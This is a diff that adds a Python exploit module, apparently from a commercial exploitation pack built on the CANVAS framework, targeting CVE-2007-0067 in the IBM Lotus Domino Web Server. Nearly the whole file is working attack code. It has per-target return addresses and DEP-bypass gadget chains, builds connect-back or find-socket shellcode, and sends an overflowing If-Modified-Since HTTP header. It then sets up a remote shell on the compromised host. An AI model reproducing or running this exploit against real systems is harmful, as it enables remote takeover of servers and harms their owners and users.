@@ -1,0 +1,193 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+
+import sys
+import random
+import struct
+
+if "." not in sys.path:
+    sys.path.append(".")
+    sys.path.append("../../")
+    sys.path.append('../../encoder')
+    sys.path.append('./encoder')
+    sys.path.append("../../shellcode")
+    sys.path.append("./shellcode")
+    sys.path.append("../../gui")
+
+import win32MosdefShellServer
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from shellcode import shellcodeGenerator
+from shellcode import win32shell
+from encoder import *
+from win32Node import win32Node
+from shelllistener import shelllistener
+
+# GUI info
+NAME = "IBM Lotus Domino Web Server Stack Overflow"
+
+DESCRIPTION = "Stack overflow vulnerability in IBM Lotus Domino Web Server"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "2007.06.04"
+DOCUMENTATION["Versions Affected"] = "IBM Lotus Domino Web Server < 7.0.2 FP2"
+DOCUMENTATION["CVE Name"] = "CVE-2007-0067"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0067"
+
+VERSION = "1.0"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000", "2003" ]
+
+NOTES = """
+"""
+
+CHANGELOG = """
+"""
+  			
+targets = {    
+    0: ['Windows 2000 SP0-SP4 / Windows 2003 SP0', 0x18201980],  # call ecx @ LTOUIN22.DLL 
+    1: ['Windows 2003 SP1 English (DEP)', 0x7c985842, 0x77be2e1b, 0x7c83e413, 0x7c86ffc3, 0x77bdeb3a], # anti-dep     
+    2: ['Windows 2003 SP1 French (DEP)',  0x7caa5842, 0x77bb2e1b, 0x7c95e413, 0x7c98ffc3, 0x77baeb3a], # anti-dep      
+    3: ['Windows 2003 SP2 English (DEP)', 0x7cac9b5a, 0x77be2e1b, 0x7c83f517, 0x7c93eeb8, 0x77bdeb3a], # anti-dep 
+    4: ['Windows 2003 SP2 French (DEP)',  0x7cbe9b5a, 0x77bb2e1b, 0x7c95f517, 0x7c922edf, 0x77baeb3a], # anti-dep 
+}  
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.ssl = 0
+        self.port = 80
+        self.host = ""   
+        self.name = NAME        
+        self.badstring = "\x00\x0a\x0d"
+        return
+
+    def neededListenerTypes(self):
+        return [canvasengine.WIN32MOSDEF]
+    
+    def createShellcode(self):
+    	self.host = self.target.interface
+	self.port = int(self.argsDict.get("port", self.port))
+        self.ssl = int(self.argsDict.get('ssl', self.ssl))
+
+    	if self.ssl:
+           sc = shellcodeGenerator.win32()
+           sc.addAttr("GOFindSock", { "setblocking" : 1 })
+           sc.addAttr("RecvExecWin32", None)
+           self.shellcode = sc.get()
+           encoder = chunkedaddencoder.intelchunkedaddencoder()
+           encoder.setbadstring(self.badstring)
+           self.log("Encoding shellcode")
+           self.shellcode = encoder.encode(self.shellcode)
+        else:
+           self.shellcode = self.createWin32Shellcode(self.badstring, self.callback.ip, self.callback.port)
+           
+        if self.shellcode == "":
+            self.log("Problem encoding shellcode")
+            return 0
+            
+        return self.shellcode
+    
+    def run(self):
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+        
+        s = self.gettcpsock()
+        
+        try:                
+            s.connect((self.host, self.port))
+            self.websend(s, sploitstring)   
+                            
+            if self.checkTriggerWin32(s, falsepositive=1):
+            	self.setInfo("%s attacking %s:%d - done (success!)"% (NAME, self.host, self.port))
+            	return self.doStageTwo(s)
+            else:	
+            	self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME, self.host, self.port))
+            	return 0
+        except:       
+            self.log("Could not connect to port %s with ssl=%s" % (self.port, self.ssl))                 
+            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME, self.host, self.port))
+            return 0                       
+                   
+
+    def doStageTwo(self, s):
+        self.log("Got trigger!")
+        node = win32Node()
+        node.parentnode = self.argsDict["passednodes"][0]
+        newshell = win32MosdefShellServer.win32shellserver(s, node, self.logfunction)
+        newshell.node.startup()
+        self.setInfo("%s attacking %s:%d - (succeeded!)" % (NAME, self.host, self.port), showlog=1)         
+        return newshell.node
+        
+    def makesploit(self):
+        """
+        Construct the attack
+        """
+        
+        # Windows 2003 SP1/SP2
+        if (self.version >= 1):             					  		
+		os_name, anti_dep_1, anti_dep_2, anti_dep_3, anti_dep_4, anti_dep_5 = targets[self.version]
+	
+		buff = "\x90"*0x400
+		tmp = buff[0:300]
+		tmp += self.shellcode
+		tmp += buff[len(self.shellcode):]            			    			    			
+		
+		ad1 = struct.pack('<L', anti_dep_1) # push esp / pop ebp / ret @ shell32.dll    			
+		ad2 = struct.pack('<L', anti_dep_2) # add esp,1c @ msvcrt.dll
+		ad3 = struct.pack('<L', anti_dep_3) # anti dep @ ntdll.dll
+		ad4 = struct.pack('<L', anti_dep_4) # call esp @ ntdll.dll
+		ad5 = struct.pack('<L', anti_dep_5) # add esp,2c @ msvcrt.dll
+		    			
+		sploitstring = "GET /icons/abook.gif HTTP/1.0\r\nIf-Modified-Since: Wed, 18 Nov 2006 20:12:02 GMT" + "\x90"*0xd8 + ad1 + "\xff"*0x4 + ad2 + ad5 + "\xff"*0x18 + ad3 + ad4 + "\xff"*0x10 + ad4 + tmp + "\r\nHost: " + self.host + "\r\n\r\n"
+
+	# Windows 2000 / Windows 2003 SP0        	
+        else:                  
+		os_name, ret = targets[self.version]
+		
+		buff = "\x90"*0x400
+		tmp = buff[0:300]
+		tmp += self.shellcode
+		tmp += buff[len(self.shellcode):]
+
+		eip = struct.pack('<L', ret) 
+
+		sploitstring = "GET /icons/abook.gif HTTP/1.0\r\nIf-Modified-Since: Wed, 18 Nov 2006 20:12:02 GMT" + "\x90"*0xd8 + eip + tmp + "\r\nHost: " + self.host + "\r\n\r\n"
+								                    
+        return sploitstring
+
+    def displayVersions(self):
+        i = 0
+        print 'Available versions:'
+        for listline in targets.values():
+            print "\t%d: %s" % (i,listline[0])
+            i += 1
+
+    def usage(self):
+        print "Usage: %s -v version -t targethost -p port -l localip -d localport [-O ssl:0|1]\n" % (sys.argv[0])
+        self.displayVersions()
+        sys.exit(0)
+
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION, VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
+    if ret not in [0, 1, None]:
+        ret.interact()
+
